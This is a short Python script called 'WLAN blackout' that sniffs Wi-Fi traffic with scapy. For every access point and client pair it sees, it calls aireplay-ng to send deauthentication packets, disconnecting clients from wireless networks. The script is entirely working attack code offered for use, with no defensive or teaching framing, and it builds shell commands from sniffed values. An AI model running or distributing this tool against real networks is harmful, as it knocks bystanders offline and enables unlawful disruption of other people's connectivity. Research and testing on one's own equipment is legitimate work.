#!/usr/bin/python
try:
    import sys,os
    from scapy.all import *
except:
    print "[-] Could not import all needed things, be sure you have Python, aircrack-ng and scapy installed"
    sys.exit(0)

def deauth_flood(p):
    if p.haslayer(Dot11):
        mac = {}
        mac["ap"]=p.sprintf("%Dot11.addr1%")
        mac["station1"]=p.sprintf("%Dot11.addr2%")

        if not mac["ap"]=="ff:ff:ff:ff:ff:ff" and mac["station1"]!="None":
            os.system("aireplay-ng -0 1 -a "+mac["ap"]+" -c "+mac["station1"]+" "+sys.argv[1]+" &")# Remove " &" for a slower attack rate.

def instructions():
    print "== WLAN blackout - written by Jelmer de Hen - published at http://h.ackack.net ==\n\ninstructions:\n"
    print "python "+sys.argv[0]+" [iface]"
    print "python "+sys.argv[0]+" mon0"

if len(sys.argv)>1:
    print "[+] Searching for packets..."
    sys.exit(sniff(iface=sys.argv[1],prn=deauth_flood))
else:
    sys.exit(instructions())
